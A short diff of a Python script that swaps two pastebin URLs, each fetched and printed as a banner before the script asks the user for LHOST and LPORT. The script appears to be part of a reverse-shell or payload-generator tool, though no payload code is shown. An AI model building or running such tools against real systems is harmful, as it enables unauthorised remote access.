@@ -151,7 +151,7 @@ def tentar():
                 return tentar()
             else:
                 clear()
-                r = requests.get('https://pastebin.com/raw/RyGAUCGs')
+                r = requests.get('https://pastebin.com/raw/C2iqfNzA')
                 print(F.LIGHTYELLOW_EX + r.text + F.RESET)
                 ip = input(f'\n\n{F.LIGHTGREEN_EX}[*] SET LHOST > {F.RESET}')
                 port = input(f'\n\n{F.LIGHTGREEN_EX}[*] SET LPORT > {F.RESET}')
@@ -167,7 +167,7 @@ def tentar():
                 return tentar()
             else:
                 clear()
-                r = requests.get('https://pastebin.com/raw/C2iqfNzA')
+                r = requests.get('https://pastebin.com/raw/RyGAUCGs')
                 print(F.LIGHTYELLOW_EX + r.text + F.RESET)
                 ip = input(f'\n\n{F.LIGHTGREEN_EX}[*] SET LHOST > {F.RESET}')
                 port = input(f'\n\n{F.LIGHTGREEN_EX}[*] SET LPORT > {F.RESET}')
